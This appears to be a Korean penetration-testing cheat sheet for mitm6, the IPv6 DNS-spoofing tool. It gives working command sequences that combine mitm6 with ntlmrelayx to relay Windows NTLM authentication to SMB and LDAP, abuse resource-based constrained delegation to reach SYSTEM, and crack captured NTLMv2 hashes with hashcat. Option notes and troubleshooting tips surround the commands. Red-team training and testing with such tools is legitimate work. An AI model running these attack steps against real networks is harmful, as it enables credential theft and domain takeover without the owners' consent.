# mitm6

- mitm6 — IPv6 DHCPv6·DNS 스푸핑 도구. Windows는 기본으로 IPv6를 선호하기 때문에 mitm6가 주는 가짜 DNS 답으로 타깃 호스트의 인증을 공격자 쪽 WPAD·릴레이 서버로 끌어온다.
- SMB·LDAP 서명이 켜져 릴레이가 막힌 환경에서 인증을 다시 끌어낼 때, WPAD 프록시 인증으로 유저 해시를 뽑을 때, Responder(LLMNR)가 막힌 네트워크에서 대안이 필요할 때.
- 루트 권한, 필터링할 도메인 1개 이상, 같은 세그먼트의 Windows 호스트(IPv6 기본 설정).

## 기본 사용

```bash
sudo mitm6 -d corp.local
sudo mitm6 -d corp.local -i eth0 -v
```

- `-d`: 가로챌 DNS 질의의 도메인 필터. 여러 번 지정 가능. 반드시 지정하는 것이 안전하다.
- `-i`: 인터페이스(기본 자동 감지). `-v`: verbose, `--debug`: 디버그.

## 주요 옵션

- `-a/--no-ra`: rogue Router Advertisement를 감지하는 네트워크에서 광고를 끔.
- `-4/--ipv4 <IP>`·`-6/--ipv6 <IP>`: 발신 주소 직접 지정(기본 자동 감지).
- `-r/--relay <호스트>`: 가짜 DNS 서버 호스트명으로 Kerberos 인증을 유도(krbrelayx 연계용).
- `-hw/--host-allowlist`·`-hb/--host-blocklist`: 클라이언트 FQDN 기준 필터.
- `--ignore-nofqdn`: FQDN 옵션 없는 DHCPv6 질의 무시.

## ntlmrelayx 조합 (대표 공격 흐름)

```bash
# 터미널 1
sudo mitm6 -d corp.local

# 터미널 2 — WPAD 프록시로 HTTP 인증을 받아 SMB 릴레이(서명 우회)
ntlmrelayx.py -6 -wh wpad.corp.local -of loot -t smb://10.10.10.1 -l loot

# 터미널 2 — LDAP 릴레이로 RBCD(자원 기반 제한 위임) 설정
ntlmrelayx.py -6 -wh wpad.corp.local -t ldap://10.10.10.1 --delegate-access -l loot
```

- `-6`: IPv6도 함께 청취(mitm6 트래픽은 IPv6로 온다).
- `-wh`: WPAD 호스트 스푸핑. mitm6가 가짜 DNS 답을 주기 때문에 존재하지 않는 이름이면 된다.
- `-of`: 인증 덤프 파일, `-l`: loot 저장 폴더. `--delegate-access`: RBCD(자원 기반 제한 위임) 설정.
- MS16-077 패치가 없는 환경에서는 `-wa N`으로 프록시 인증 프롬프트를 강제 시도한다.

## 실전 흐름 예시

```bash
sudo mitm6 -d corp.local
ntlmrelayx.py -6 -wh wpad.corp.local -of loot -t smb://10.10.10.1 -l loot
# 유저가 프록시 인증을 보내면 loot 폴더에 해시와 덤프가 쌓인다
hashcat -m 5600 loot/*ntlmv2* rockyou.txt
```

## 팁·트러블슈팅

- `-d` 없이 돌리면 DC의 DNS 질의까지 뒤집어 사실상 서비스 장애를 만들 수 있다. 도메인 필터는 필수다.
- 대상이 IPv6를 껐으면 DHCPv6 요청이 없어 아무 일도 일어나지 않는다. Responder(LLMNR) 쪽으로 돌아간다.
- SMB 릴레이가 실패하면 서명 요구 때문이다. `-wh` WPAD(HTTP) 릴레이나 LDAP 릴레이(RBCD)로 전환.
- 컴퓨터 계정 생성 권한이 있으면 mitm6 + ntlmrelayx + --delegate-access 조합이 RBCD로 SYSTEM까지 가는 대표 경로다.
